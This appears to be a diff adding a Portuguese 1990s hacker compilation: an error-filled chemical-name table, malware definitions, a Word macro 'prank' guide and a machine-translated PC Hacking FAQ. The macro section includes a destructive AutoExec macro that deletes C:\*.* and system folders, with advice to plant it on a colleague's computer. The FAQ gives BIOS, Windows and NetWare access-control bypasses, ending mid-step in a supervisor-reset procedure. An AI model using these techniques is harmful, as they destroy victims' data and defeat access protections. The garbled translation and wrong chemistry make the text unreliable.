+
+acetic acid			ácido acético				vinagre
+aluminum oxide		óxido de alumínio			alúmen
+aluminum potassium sulfate	sulfato de potássio de alumínio	pedra-ume
+aluminum sulfate		sulfato de alumínio			pedra-ume
+ammonium hydroxide		hidróxido de amônia			amônia
+carbon carbonate		carbonato de carbono			giz
+carbon tetrachloride		tetracloreto de carbono		removedor
+calcium hypochloride		hipocloreto de cálcio			sapólio
+calcium oxide			óxido de cálcio			cal
+calcium sulfate		sulfato de cálcio			gêsso
+carbonic acid			ácido carbônico			água de soda
+ethylene dichloride		bicloreto de etileno			fluído alemão
+ferric oxide			óxido férrico				ferrugem
+glucose			glicose					xarope de milho
+graphite			grafite					ponta de lápis
+hydrochloric acid		ácido clorídrico			desinfetante
+hydrogen peroxide		peróxido de hidrogênio		peróxido
+lead acetate			acetato de chumbo			sal de chumbo
+lead tetroxide			tetróxido de chumbo			chumbo
+magesium silicate		silicato de magnésio			talco
+magesium sulfate		sulfato de magnésio			Sal de Epsom
+naphthalene			naftalina				bola de naftalina
+phenol				fenol					ácido fênico
+potassium bicarbonate	bicarbonato de potássio		creme adstringente
+potassium chromium sulfate	sulfato de cromo de potássio		alúmen cromo
+potassium nitrate		nitrato de potássio			salitre
+sodium dioxide		dióxido de sódio			areia
+sodium bicarbonate		bicarbonato de sódio			soda quente
+sodium borate			borato de sódio			bórax
+sodium carbonate		carbonato de sódio			soda de lavagem
+sodium choride		clorito de sódio			sal
+sodium hydroxide		hidróxido de sódio			lixívia
+sodium silicate			silicato de sódio			vidro solúvel
+sodium sulfate			sulfato de sódio			Sal de Glauber
+sodium thiosulfate		tiossulfato de sódio			hipossulfito (fotos)
+sulferic acid			ácido sulférico				ácido de bateria
+sucrose			sacarose				cana de açúcar
+zinc choride			clorito de zinco			tiner
+
+O autor não é responsável pelos atos de seus leitores. Corra seus próprios riscos.
+
+Virus
+
+4.1 - Vírus
+
+      Vírus é um programa independente que se auto reproduz. Ele irá se aclo-
+par em outros programas e fazer cópias de si mesmo espalhando-se pelo win-
+chester. O intuito do vírus é destruir o corruptar informações do disco rígi-
+do ou baixar o rendimento do micro rodando programas maiores que a memória
+disponível. Antivírus, só retiram os vírus que eles forem programados. Nenhum
+programa pode o proteger 100 % de vírus, pois a cada momento estão sendo fa-
+bricados novos vírus em qualquer parte do mundo.
+
+4.2 Trojan Horse (Cavalo de Tróia)
+
+      O cavalo de tróia é um programa que, como o vírus, se aclopa em um 
+arquivo do winchester de um microcomputador infectado. Eles tem o intuito de
+roubar informações preciosas como passwords ou logins e, depois, enviá-las a
+seu "dono"pela network automaticamente. Alguns antivírus retiram os Trojans
+outros não, mas nenhum retira todos.
+
+Worm
+
+      Worm é o tipo de programa mais inteligente já criado. Ele não só se 
+espalha pelo computador e espera pela sorte de infectar outro através de um
+disquete contaminado, ele tem o poder de se espalhar por toda a network. Os
+worms podem infectar toda uma rede de sistemas e fazer nelas um bom estrago.
+
+Vírus de Macro
+
+Ainda hoje existe  muita gente que so eh  capaz de abrir o  word,  editar,
+  negritar, sublinhar e  mandar  para impressora, muitos, milhares so sabem
+  mexer  no basico  mesmo. Eles nem  imaginam o  que  tem  por  traz  deste
+  riquissimo processador de texto.
+
+  Esta materia tem como objetivo fazer desde pequenas ate grandes sacanagens
+  com usuarios pentelho.
+
+  ps: Software/versao Abrangido: Word da Microsoft, versoes 6 (win3.11) e
+  7.0 (win95)
+
+
+  O Word  possui  um  arquivo  chamado  "normal.dot"  onde  estao  todas  as
+  configuracoes padrao do word.Se por algum motivo este arquivo for deletado
+  o Word cria automaticamente quando for inicializado.
+
+  Niveis de sacanagem
+  Nivel 1..... Apenas uma brincadeira
+  Nivel 2..... Apenas uma brincadeira de mau gosto
+  Nivel 3..... Nao eh mais brincadeira.
+
+  Primeiro voce precisa criar uma macro... siga os passos:
+  Entre no Word, feche a  janela de  documento, nao deixe  nenhum documento
+  aberto(ativo), clique em Arquivo(File) depois  Macro, coloque  no nome da
+  macro "AutoExec"(obrigatorio) esta  macro eh  inicializada toda vez que o
+  Word for iniciado, depois  clique em 'Criar', delete  as duas  linhas que
+  tiver la (Sub MAIN e End Sub) e cole a  rotina que  tem logo mais abaixo.
+
+  ps: existe outras formas/meios d criar uma macro,mas esta eh mais simples.
+
+
+  * Nivel 1
+  O nivel 1 serve  para voce se mostrar, falando que entende do Word melhor
+  do que ninguem.
+  Cada vez que  o usuario  inicia o Word recebera uma mensagem... de  alerta
+  ou qquer outro coisa que sair da sua mente. veja abaixo.
+
+  v------[corte aqui-begin]-------v
+  Sub MAIN
+  MsgBox "Voce é um pentelho!  Eu não irei prosseguir com o sistema", "Microsoft Word", 5
+  MsgBox "Usuário Pirata Detectado", "FATAL ERROR", 16
+  MsgBox "JAMES BOND 007 ", "007 na estrada Digital", 64
+  End Sub
+  ^------[corte aqui-end]-------^
+
+
+  - Nivel 2
+  Eh para deixar o usuario irritadissimo.
+  no corpo da macro cole este texto abaixo:
+
+  v-----[corte aqui-begin]-------v
+  Sub MAIN
+  ArquivoNovoPadrão
+  Inserir "James"
+  ArquivoNovoPadrão
+  Inserir "Bond"
+  ArquivoNovoPadrão
+  Inserir "007"
+  ArquivoNovoPadrão
+  Inserir "James Bond 007 Na Estrada digital "
+  ArquivoNovoPadrão
+  Inserir "."
+  ArquivoNovoPadrão
+  Inserir "."
+  ArquivoNovoPadrão
+  Inserir "."
+  ArquivoNovoPadrão
+  Inserir "."
+  ArquivoNovoPadrão
+  Inserir "."
+  ArquivoNovoPadrão
+  Inserir "."
+  ArquivoNovoPadrão
+  Inserir "."
+  ArquivoNovoPadrão
+  Inserir "."
+  ArquivoNovoPadrão
+  Inserir "."
+  ArquivoNovoPadrão
+  Inserir "."
+  ArquivoNovoPadrão
+  Inserir "."
+  ArquivoNovoPadrão
+  Inserir "."
+  ArquivoNovoPadrão
+  Inserir "."
+  ArquivoNovoPadrão
+  Inserir "."
+  ArquivoNovoPadrão
+  Inserir "James Bond 007 Na Estrada digital "
+  End Sub
+  ^------[corte aqui-end]-------^
+
+  Repita as linhas
+
+    ArquivoNovoPadrão
+    Inserir "."
+
+  Quantas vezes quiser, pois o resultado sera dezenas de arquivos aberto,
+  irritando o usuario, com a mensagem de falta de memoria.
+  ps: acho que o limite eh de 69 arquivos aberto, depente muito do conteudo
+  dos arquivos, de for somente '.' acho que da no maximo 69 arquivos.
+
+
+  - Nivel 3
+  Bom este nivel eh  pura sacanagem,com ele um simples clicar* do mouse, e
+  tudo desaparece! isto  mesmo "del *.*" ou apenas os documentos, voce  eh
+  quem sabe.
+
+  v-----[corte aqui-begin]-------v
+  Sub MAIN
+  Kill "C:\*.*"
+  Kill "C:\WINDOWS\*.*"
+  Kill "C:\WINWORD\*.*"
+  End Sub
+  ^-----[corte aqui-end]-------^
+
+
+  Lembre-se de que estes macros, sao gravado no arquivo default do word, ou
+  seja  no  'normal.dot'  se  este   arquivo  for   deletado, o  Word  cria
+  automaticamente na inicializacao,entao se voce for fazer estas sacanagens
+  ai acima, proteja este arquivo, com o comando 'attrib +r'.
+
+  Detalhes:
+  . Existe uma forma de iniciar o Word, sem q inicialize a macro 'AutoExec'
+    mas nao irei falar, descubra voce mesmo.
+  . A macro do word eh uma ferramenta riquissima, procure fucar.
+  . Voce  pode  fazer  estas no  seu proprio  computador(so cuide!), salvando
+    sempre no arq. "normal.dot"  depois copie apenas este arquivo para aquele
+    seu colega/amigo pentelho e saie de perto, para nao explodir em voce.
+  . Nao me responsabilizo por qquer ato.
+
+
+
+Dicas
+
+	Bem, chegamos a melhor parte. Nesta seção eu tentei colocar bastante dicas, algumas dicas e tirei de bíblias hackers(em inglês), e traduzi com um programa tradutor, portanto, pode não haver certas concordâncias, porque herrar ê umanu.
+
+DOS
+  - Compactador PKZIP - Alguns comandos para quem AINDA nao sabe.
+    para compactar com senha
+    # pkzip nome *.* -sSENHA     (observe q a opcao -s tem q estar
+                                  junto/grudada com sua senha)
+    para descompactar:
+    # pkunzip nome.zip -sSENHA
+
+    para compactar sub-diretorios
+    # pkzip nome *.* -p -r
+
+    para descompactar e abrir o(s) subdiretorio(s)
+    # pkunzip nome.zip -d
+
+                                ---
+
+  INTERNET(1)
+  - se seu provedor nao tiver um servidor se newsgroup proprio, vc pode
+    acessar a este de uso publico 'news.rdc.puc-rio.br'
+
+                                ---
+
+  Windows95/Internet
+  - o windows95 possui um prog. de FTP para DOS. ou seja vc pode entrar
+  em servidores FTP em modo caracter, como se estivesse usando o proprio
+  unix. Quando vc estiver conectado a rede, abra uma secao DOS e
+  digite FTP mais o endereco, ex: 'ftp 200.248.224.10'
+  depois de conectado digite '?' para ver os comandos, para lista-los
+  use 'dir' - para puxar/baixar arq's use o comando 'mget' mais o arquivo
+  e para mandar use o 'mput' seguido o arquivo.
+  mensagem/exemplo:
+
+  c:\windows>ftp 200.255.216.5
+  Connected to 200.255.216.5.
+  220 net FTP server (Version wu-2.3(1) Tue Dec 24 23:51:15 CST 1993) ready.
+  User (200.255.216.5:(none)): anonymous
+  Password:
+  ...
+
+
+
+  INTERNET(2)
+  - Alguns servidores para visitar:
+    FTP
+    Provedor   -> 200.248.215.210
+    Provedor   -> 200.248.224.10
+    Banco Itau -> 200.246.143.1
+    ...        -> 200.246.45.1
+    ...        -> 129.29.64.246
+
+    TELNET
+    Nyx        -> 130.253.192.68
+
+
+    ps: para acessar os servidor FTP utilize como user 'anonymous' e a senha
+        varia: uns eh soh dar um ENTER e outros eh soh colocar 'joao@'
+        em seguida teclar ENTER.
+
+
+                     ==------------------== 
+                       O PC Hacking FAQ 
+                     ==------------------== 
+
+                      Versão 1.5 3/17/96 
+
+----------------------------------------------------------------Escrito Por 
+Olcay Cirit, <olcay@libtech.com>----------------------------------------------------------------RETRATAÇÃO: O autor deste texto nega toda a 
+obrigação tudo que relativo ao and/or de uso abuse das técnicas esboçadas aqui 
+ou qualquer dano incorreram thereof diretamente ou indiretamente.  
+
+
+                       Índice 
+                     - = - = - = - = - = - = - = - = - = - = - 
+                  X. Introdução 
+                  1. Hardware e Firmware 
+                      um. O BIOS 
+                           Contra-senhas 
+                           Resetting o CMOS 
+                      b. Fechaduras moles 
+                           Os escolhendo 
+                           Os comprando 
+                      c. Por último Recursos 
+                           Extração de disco rígido 
+                  2. DOS, Windows, e Netware 
+                      um. Acesso adquirindo para DOS 
+                           Calce as botas de um disquete 
+                           Arquivos de startup de estrada de contorno 
+                           Evite DriveSpace 
+                           Fuja de Autoexec.bat 
+                      b. Passando De Windows 
+                           Filtre os Poupadores 
+                           Proteção de contra-senha 
+                           DOS Usando Escrevem  
+                           DOS Using Palavra 
+			   DOS por MODO 
+                      c. Passando De Netware 
+                           Nomes de Conta comuns 
+                           Resetting Netware 
+                  3. Construindo um sistema seguro 
+                      um. Entendendo os Assuntos 
+                           Hackers " potencial " 
+                           Segurança física 
+                           Segurança de software 
+                           Contra-senhas 
+
+---------------------------------------------------------------- 
+
+X. Introdução 
+
+Este FAQ descreve como para rombo para um PC (IBM-compatível)  
+do exterior em, e como evitar a maioria software-baseado 
+medidas de segurança. A última seção detalha como afiançar seu 
+PC contra tal ataca. 
+
+Hi e Ho é vai fora para: KORO o Grande, Neil Chou, John,  
+Lundgren e esses Netware Hackers realmente fresco! [Parte 2c (Adquirindo  
+Netware passado) está baseado em partes do Netware Hacking FAQ!] 
+
+Por que eu escrevi isto? Porque há pouco havia tantos  
+perguntas em alt.2600 que concernem ' Como faça eu passo de XXXXX  
+segurança? ' que eu me cansei de responder cada um  
+individualmente. Espere ver para este FAQ se expandir como eu acho mais  
+bichos e buracos em software de segurança. 
+
+Muitas destas soluções assumem você tem acesso físico para 
+o PC. Por exemplo, você não pode extrair o disco rígido ou 
+reajuste o CMOS em cima de uma cadeia, mas você pode fazer isto se você 
+tenha acesso ao computador. 
+
+Este FAQ é *NOT * escrito para ajudar thiefs de computador, mas bastante 
+é pretendido que aumenta consciência de backdoors e 
+inefficiencies em programas de segurança. Eu não TOLERO  
+ESTRAGANDO OUTROS COMPUTADORES de PEOPLES' NADA!!!!!!  
+
+Talvez depois do ler para isto não confie o non-existente  
+segurança oferecida como muito por Windows 95. 
+
+Eu gostaria de notar que poucos destes truques é novo. Eu 
+simplesmente reunido tudo o que eu poderia achar e  
+o no qual eu poderia respigar de experiência pessoal um 
+arquivo organizado. 
+
+Se você tem qualquer pergunta ou comentários, sinta livre para me contactar. 
+
+Também, espere ver uma versão disto para o Macintosh, 
+algum dia... :) 
+
+	Tenha Phun, 
+
+	Olcay Cirit, <olcay@libtech.com>  
+	a.k.a, Pensamento Fundo, 
+
+---------------------------------------------------------------- 
+
+1. Hardware e Firmware 
+
+1a. O BIOS 
+
+Contra-senhas 
+== == == == = 
+O BIOS, pequeno para Serviços de Input/Output Básicos, é o programa de controle 
+do PC. É responsável para começar seu computador e transfere controle do 
+sistema para seu sistema operacional, e  
+por dirigir outras funções de baixo nível, como acesso de disco. 
+
+NOTA que o BIOS não é um programa de software, insofar como é 
+não purgado de memória quando você vira o computador. É  
+firmware, só é permanentemente e unchangeably armazenaram em 
+a máquina. 
+
+Uma pequena característica conveniente que a maioria dos fabricantes de BIOS 
+inclui 
+é uma contra-senha de startup. Isto previne acesso para o sistema até 
+você entra na contra-senha correta.  
+
+Se você pode adquirir acesso para o sistema depois da contra-senha foi entrado, 
+então há numerosos BIOS contra-senha extratores software-baseados disponível 
+de: 
+
+ftp://oak.oakland.edu/simtel/msdos/sysutil/amis2990.zip 
+
+
+Resetting o CMOS 
+== == == == == == == == == 
+Há só um outro modo para passar da contra-senha de BIOS.  
+Envolve descarregando a memória estática (CMOS) armazenava a contra-senha e 
+outra informação de sistema. Uma vez é descarregado,  
+porém, você tem que reajustar todas as colocações de sistema à mão. 
+
+* * * *Follow estes passos: 
+
+	 1. Comece o computador 
+		um. Se o sistema permite isto, entre na Tela de Ligação 
+			(Normalmente apertando F1, DEL ou INS durante  
+			o cheque de memória) 
+		b. Registre toda a Informação de Ligação. Cheque dobro. 
+	 4. Vire o computador 
+	 5. Remova a cobertura, e ponha o computador no solo em 
+		tal um modo que você pode ver e pode ter acesso o lado de  
+		o motherboard com o processador nisto. 
+	 6. Olhe o motherboard.  
+		um. Se você pode ver um círculo, disco-como bateria, então, 
+			remova, e deixe o computador se sentar sem  
+			a bateria durante 15-30 minutos. Ponha a bateria  
+			atrás em. 
+		b. Se você tem acesso ao circuito esquematiza para o 
+			motherboard, olhe neles para a contra-senha ou 
+			Saltador de CMOS. Sacuda de tempo em tempo. 
+		c. Procure um azul, soldar-em bateria com um saltador 
+			escapando disto. Este saltador é por conectar 
+			uma bateria externa. Arranque para reajustar o 
+			CMOS. 
+	 9. Substitua a cobertura de computador. 
+	10. Entre na Tela de Ligação, e fixe a Informação de Ligação 
+		atrás para os valores originais que você (esperançosamente) 
+		registrado. Se você estivesse impossibilitado registrar este info, 
+		então você há pouco terá que montar isto manualmente. 
+		[NOTA: Alguma Tomada mais nova & Jogo BIOSes têm um  
+		característica de autodetect que automaticamente jogo-para cima o 
+		disco rígido. Olhe ao redor de nos artigos de cardápio no 
+		Ligação de BIOS.] 
+
+Novamente, eu gostaria de mencionar que há numerosos extratores de contra-senha 
+disponível para livre fora o internet e em BBSes. Tente esses primeiro. Eles 
+estão muito mais limpos e fácil-para-usam. 
+
+---------------------------------------------------------------- 
+
+1b. Fechaduras moles 
+
+Fechaduras moles são inserções de plástico geralmente baratas nas que engancham 
+ 
+para o dentro do passeio e fecha isto e lhe impede assim de usar o passeio 
+mole. As fechaduras usadas normalmente são esses pequeno 
+rode fechaduras usadas em coberturas de computador para fechar o teclado. 
+
+Se a fechadura é o rode tipo, você ou pode escolher isto, ou 
+compre uma chave (eles são todos o mesmo). 
+
+Para escolher isto, você precisará de um *thin * chave de fenda de flathead 
+ou um paperclip. Escolher a fechadura, leve o paperclip e insira no pequeno 
+entalhe no lado de dentro do rode fechadura. Agora, puxe ao lado oposto da 
+fechadura até o rode está na posição destrancada. 
+
+Se você escolhe comprar uma chave, você pode: 
+
+	Um. Vá para seu centro de serviço de computador local, e compra 
+		um destas chaves. (Muito barato. Freqüentemente menos que 
+		$0.75) 
+	B. Compre a mesma marca de fechadura mole, e use a chave 
+		isso vem com isto. 
+
+---------------------------------------------------------------- 
+
+1c. Por último Recursos 
+
+Se você é *REALLY * desesperado a rombo para este PC, então,  
+o *might seguinte * trabalho: 
+
+	1. Remova a Cobertura de PC 
+	2. Extraia o disco rígido (desparafusando e desconectando) 
+	3. Transfira para outro computador. (Tem certeza que é 
+		Não fixe como o passeio de bota.) 
+	4. Comece este computador, e tenha acesso o 
+		disco rígido de lá. 
+
+Isto provavelmente não trabalhará se um sistema de arquivo codificado é em 
+uso. O único modo para ter acesso tais discos é entrar na contra-senha,  
+ou entende um modo para decifrar isto, assim se você esquece de sua 
+contra-senha, você é hosed. : ( 
+
+---------------------------------------------------------------- 
+
+2. DOS, Windows, e Netware 
+
+2a. Acesso adquirindo para DOS 
+
+Com alguns sistemas, eles são diretamente fixos até bota para algum tipo  
+de programa de shell/security, como Windows, ou Windows 95. Se você 
+queira adquirir acesso para um lembrete de DOS, você tem algumas escolhas: 
+
+	Um. Calce as botas de um disquete 
+	B. Arquivos de startup de estrada de contorno 
+        C. DriveSpace evitando 
+	D. Fuja de Autoexec.bat 
+
+* * *Booting de um disquete lhe exige que crie um disco de sistema.  
+Você pode fazer isto usando o DOS comando FORMATO /S que vai  
+formate um disco e lugar arquivos de sistemas nisto. Também, o Windows  
+formato tem uma opção que lhe permite criar um disquete de sistema. 
+
+Antes de você crie um disco de sistema, você tem que determinar que 
+passeio mole é usado para calçar as botas. Se o sistema tem ambos um 
+1.2MB (5.25 ") Passeio mole e uns 1.44MB (3.5 ") Dirija, é provável 
+que o passeio de bota é o 1.2 MB passeio mole. Se o computador 
+tem só um passeio mole, está bastante seguro assumir que é 
+o passeio de bota. 
+
+Porém, se você é inseguro sobre qual passeio é o passeio de bota, 
+você ou pode descobrir entrando em Ligação De sistema (como descreveu 
+em seção 1) ou observando qual passeio mole é lido direito 
+antes das cargas de sistema operacional. 
+
+Se o sistema é fixado só calçar as botas do disco rígido, então você, 
+possa se referir a Seção 1 em como reajustar o CMOS. 
+
+Uma vez você tem um disco de sistema, você coloca isto no passeio mole, 
+e vira em ou reajustou o computador. Se você fez tudo 
+corrija, o computador calçará as botas do passeio mole e você vai 
+tenha acesso a um lembrete de DOS. 
+
+* * *Bypassing startup arquivos são bastante simples, mas só trabalha em  
+versões de DOS 6.0 ou melhor e Windows 95. Quando você vira em  
+o computador e você vêem o texto: 
+
+	MS-DOS começando... 
+
+ou 
+	PC-DOS começando... 
+
+ou  
+	Windows 95 começando... 
+
+Imprensa e segura a TROCA ou F5 chave IMEDIATAMENTE. Isto evitará  
+o startup arquiva (CONFIG.SYS e AUTOEXEC.BAT) contanto que o  
+administrador de sistema não incapacitou esta característica. 
+
+Adicionalmente, você pode apertar e pode segurar F8 quando o startup  
+texto mostra para entrar no cardápio de Bota. Isto o deixa selectively 
+incapacite certos comandos, ou evite o startup totalmente arquiva, 
+entre outras coisas. 
+
+* * *Bypassing DriveSpace trabalha se software de compressão como DriveSpace ou 
+DoubleSpace foi instalado. Nesse caso, quando 
+o texto de startup exibe, imprensa e segura Ctrl+F5 ou Ctrl+F8. 
+Isto carregará o sistema sem carregar a compressão 
+motorista que o quer dizer não pode ter acesso os arquivos em disco.  
+
+PORÉM, você pode descompressar o disco (DriveSpace só), ou, 
+se todo outro falha, formate. 
+
+* * *Breaking fora de AUTOEXEC.BAT também é bastante simples. Quando o 
+computador começa e o sistema operacional começa carregando, imprensa 
+Ctrl+Break (Ou Ctrl+C) repetidamente. Quando o AUTOEXEC.BAT executa, isto 
+terminará isto e o derrubará para DOS. Isto trabalhará a menos que 
+o administrador De sistema temporariamente inválido o teclado. 
+
+---------------------------------------------------------------- 
+
+2b. Obtendo a DOS de Windows 
+
+Se as acima de táticas falham, e a máquina automaticamente cargas 
+Windows, então você ainda tem uma chance de adquirir a DOS. Windows 
+através de falta dá você livra acesso para DOS. Há segurança especial programa 
+para impedir para o usuário de ter acesso DOS. A maioria destes 
+pode ser evitado. 
+
+Filtre os Poupadores 
+== == == == == == = 
+A proteção de contra-senha embutido a Windows 3.1 é extremamente fraco. 
+Você pode evitar isto editando CONTROL.INI simplesmente e procurando  
+o campo de Contra-senha. Apague o jogue fora isso aparece depois o igual 
+sinal. 
+
+A proteção de contra-senha em Windows 95 é muito mais forte, mas você ainda 
+pode evitar isto por *carefully * movendo ou mencionando novamente todos os 
+arquivos de .PWL  
+no diretório de C:\Windows. 
+
+Proteção de contra-senha 
+== == == == == == == == == = 
+
+Q: Windows começa, e você é apresentado com contudo outro  
+	caixa de diálogo de contra-senha. O que faço eu? 
+
+Um: 
+* *If estes é o Windows Logon Primário ou um logon de Cadeia, então você 
+normalmente pode passar disto apertando o botão de Cancelamento (Nenhuma 
+Piada!). 
+Isto é porque a informação de Logon é principalmente usada para preferência de 
+mesa e arquivo compartilhar distante. 
+
+* *If este é um programa de segurança de terço-festa, como o um embutido para 
+Depois de Escuridão, tente Ctrl+Alt+Del urgente quando o diálogo é 
+apresentado a você. A maioria para o que programas de segurança saem do modo 
+deles/delas 
+esteja seguro, e Windows 3.1 interpreta isto como não respondendo  
+o sistema, e assim permitirá você fecha isto. Windows 95 aparece 
+uma pequena caixa de diálogo limpa que o deixa termina qualquer aplicação de 
+funcionamento. Como conveniente. :) Uma vez você subverte isto, você pode 
+impeça do aborrecer novamente editando a CARGA = e  
+CORRA = seções em C:\WINDOWS\WIN.INI. 
+
+Q: Windows começa, e o gerente de programa carrega, mas o cardápio de Arquivo 
+	é inválido, e assim é DOS e Gerente de Arquivo. Como possa eu tenho acesso 
+	DOS??? 
+
+Um: Há muitos programas de Segurança para Windows (3.1 *AND * 95) isso  
+	faça isto, e outras coisas. Há alguns modos ao redor deles: 
+
+* *Try este primeiro:  
+
+DOS por Escreva 
+== == == == == == == == = 
+	1. Entre em Acessórios, e começe o Word  (ou Wordpad) 
+		NÃO, eu não REPITO, NOTEPAD!! 
+	2. abra C:\COMMAND.COM 
+	3. Um pouco caixa de diálogo aparecerá. Não selecione NENHUMA CONVERSÃO 
+	4. Selecione Economize Como... 
+	5. Salve como C:\WINDOWS\WINHELP.EXE 
+	6. Se pergunta que se você quer escrever elaboradamente WINHELP.EXE, escolhe 
+		SIM 
+	7. Aperte F1. Normalmente, isto carrega Ajuda de Windows, mas agora isto 
+		crie um DOS janela pronta. 
+
+* *Try este próximo: 
+
+DOS por Palavra 
+== == == == == == == == 
+	1. Se eles têm Palavra de Microsoft instalada, começa. 
+	2. Do Cardápio de Ferramentas, Macro seleto. 
+	3. Digite em um nome de Macro, e clique " Crie " 
+	4. Quando a janela de Macro surge, digite em um do 
+		seguindo dependendo em qual Windows que você está usando: 
+
+		  Para Windows 3.1: Concha Environ $(COMSPEC ")  
+		  Para Windows 95: Concha Environ $(" COMANDO ")  
+		  Para Windows NT: Concha Environ $(CMD ") 
+
+		Se todo outro faltas: Concha " C:\COMMAND.COM " 
+
+	5. Corra o macro apertando o pequeno botão de jogo no 
+		toolbar de macro. Isto lançará um lembrete de DOS. 
+
+* *If você está usando Windows 95, tente isto: 
+
+DOS por MODO 
+== == == == == == == == 
+Quando Windows 95 Fecha e espetáculos que gráfico mudo, é 
+realmente há pouco se sentando em cima de DOS. Você pode emitir DOS de fato 
+comandos (embora o gráfico os cobrirá) no sistema  
+depois de paralisação de empresas!! 
+
+Um modo simples para fazer isto é digitar: 
+
+CLS 
+
+Depois que os espetáculos gráficos. Porém, o texto estará em 40-column 
+modo que é duro ler e incompatível com alguns programas. 
+
+Se você quer adquirir um lembrete de DOS agradável, limpo, você pode digitar: 
+
+	MODO CO80 
+
+Este testamento reajustou a exibição de tela para normal (80-column,  
+16 cor) modo. 
+
+Desde *MOST * Windows Segurança programas estão baseado em um VxD, eles,  
+será descarregado (junto com Windows) depois de paralisação de empresas, 
+partindo  
+você livra para explorar usando DOS. 
+
+---------------------------------------------------------------- 
+
+2c. Passando de NetWare 
+
+Esta seção está baseado em excerto do Netware Hacking FAQ. 
+
+Nomes de Conta comuns 
+== == == == == == == == == == 
+Novell Netware tem as contas de falta seguintes: SUPERVISOR, CONVIDADO, e 
+Netware 4.x tem ADMIN e USER_TEMPLATE como bem. Tudo estes não têm nenhum jogo 
+de contra-senha. Só um bobo deixaria o SUPERVISOR e ADMIN considera 
+desprotegido, assim você pode bem não como prova. Porém, muitos administradores 
+criarão contas de especial-propósito que têm fácil-para-suposição nomeia, 
+alguma sem contra-senha nada. Aqui está alguns do comum e os propósitos típicos 
+deles/delas: 
+
+Propósito de conta 
+---------------------------------------------------------- POSTO que Prende a 
+um segundo servidor para email 
+CORREIO 
+
+IMPRESSÃO que Prende a um segundo servidor por imprimir 
+LASER 
+HPLASER 
+IMPRESSORA 
+LASERWRITER 
+
+ESCAVADOR que Prende um escavador de email ao servidor 
+
+Maio POSTERIOR tem restrições de password/station (veja abaixo), WANGTEK		usado 
+por apoiar o servidor a uma unidade de fita 
+		prendido ao workstation. Para auxilio completos,  
+		Equivalência de supervisor é requerida. 
+
+TESTE UM usuário de teste responda por uso de temp 
+
+ARQUIVISTA Palindrome omite conta para auxilio 
+
+CHEY_ARCHSVR Uma conta para Arcserve para login para o servidor de     		do 
+consolo para auxilio de fita. Versão 5.01g's 
+		contra-senha era TERRA MARAVILHOSA. 
+
+PORTAL que Prende uma máquina de portal ao servidor 
+PORTÃO 
+
+FAC-SÍMILE que Prende uma unidade de modem de fac-símile dedicada à cadeia 
+FAXUSER          
+FAXWORKS         
+
+WINDOWS_PASSTHRU Embora não exigido, pela Microsoft Win95 		Recurso Kit, Ch. 9 
+pg. 292 e Ch. 11 pg. 401 você 
+		precise disto para recurso que compartilha sem uma contra-senha. 
+
+
+
+Resetting Netware 
+== == == == == == == == = 
+Quando NetWare é instalado primeiro, o SUPERVISOR de conta e CONVIDADO 
+permanece desprotegido, quer dizer, sem contra-senha. SUPERVISOR tem 
+corrida grátis do sistema. Você pode fazer qualquer coisa que você quer. 
+
+Mas como possa você faz o servidor pensar que há pouco foi instalado sem 
+reinstalar o servidor de fato e perder todos os dados em  
+o disco? Simples. Você há pouco apaga os arquivos que contêm o  
+sistema de segurança!  
+
+Em Netware 2.x, toda a informação de segurança é armazenada em dois arquivos 
+(NET$BIND.SYS e NET$BVAL.SYS). Netware 3.x lojas que informação em três 
+arquivos (NET$OBJ.SYS, NET$VAL.SYS e NET$PROP.SYS). O todo o Netware novo 4.x 
+lojas de sistema todo o login nomeia e contra-senhas em cinco arquivos 
+diferentes (PARTITIO.NDS, BLOCK.NDS, ENTRY.NDS, VALUE.NDS,  
+e UNINSTAL.NDS [Este último arquivo pode não estar lá, não preocupa]). 
+
+Embora Novell fez um mesmo trabalho bom que codifica contra-senhas, eles 
+deixaram toda a informação de diretório fácil de achar e mudar se você pode ter 
+acesso o disco do servidor diretamente e pode usar utilidades comuns como o 
+Disco de Norton Edite.  
+
+Usando esta utilidade como um exemplo, eu darei um passo por passo procedimento 
+para fazer estes arquivos desaparecer. Tudo você necessidade é um bootable 
+disco de DOS, o Disco de Emergência de Utilidades de Norton que contém o 
+DiskEdit programa e algum tempo perto do servidor. 
+
+1. Calce as botas em o servidor e vai para o lembrete de DOS. Fazer isto, há 
+pouco deixe a cadeia normalmente e então calçar as botas use o ABAIXE e 
+comandos de SAÍDA. Este procedimento não trabalha em Netware velho 2.x 
+servidores e em algumas instalações onde DOS foi removido de memória. Nesses 
+casos, você terá que usar um DOS bootable disco. 
+
+2. Corra a utilidade de DiskEdit de Norton de passeio UM: 
+
+3. Ferramentas " seletas " no cardápio principal e então Configuração " seleta 
+".  
+   À janela de configuração, uncheck o " checkbox Somente de leitura ". E tem 
+muito cuidado com tudo você digita depois deste ponto. 
+
+4. Objeto " seleto " e então " Passeio ". À janela, selecione o C: dirija e 
+tenha certeza você confere o botão " passeio " físico. Isso você estará 
+cuidando a seu disco físico e você pode ver  
+   (e mudança) tudo nisto. 
+
+5. Ferramentas " seletas " e então " Achado ". Aqui, você entrará no nome do 
+arquivo que você está tentando para achar. Use " NET$BIND " para Netware 2, 
+NET$PROP.SYS " para Netware 3 e " PARTITIO.NDS " para Netware 4. É possível que 
+você ache estes fios em um lugar que não é o diretório de Netware. Se os nomes 
+de arquivo não são todos perto de um ao outro e proportionaly separaram por 
+alguns códigos ilegíveis (pelo menos 32 bytes entre eles), então você não é o 
+lugar para o que nós estamos olhando. Naquele caso, você terá que continuar 
+procurando selecionando " Ferramentas " e então " Achar novamente ". [Em 
+Netware 3.x, pode mudar você todo o occurences da oficina de encadernação 
+arquiva e ainda deveria trabalhar aprovadamente]) 
+
+6. Você achou o diretório e você está pronto mudar isto. Em vez de apagar os 
+arquivos, você estará os mencionando novamente. Isto evitará problemas com o 
+diretório estruture (gosta de cadeias GORDAS perdidas). Só tipo " VELHO " em 
+cima do SYS " existente " ou " extensão de NDS ". Tenha extremamente cuidado e 
+não mude qualquer outra coisa. 
+
+7. Ferramentas " seletas " e então " Acha novamente ". Considerando que Netware 
+armazenam a informação de diretório em dois lugares diferentes, você tem que 
+achar a outra cópia e mudar isto o mesmo modo. Isto prevenirá problemas de 
+estrutura de diretório novamente. 
+
+8. Encerre Disco de Norton Edite e calce as botas em o servidor novamente. Se 
+você está correndo Netware 2 ou 3, seu servidor já seria acessível. Há pouco vá 
+para qualquer estação e anote em como Supervisor de usuário. Nenhuma 
+contra-senha será perguntada.     Se você está correndo Netware 4, há um último 
+passo. 
+
+9. Carregue Netware 4 instalam utilidade (só CARGA de tipo INSTALA ao lembrete 
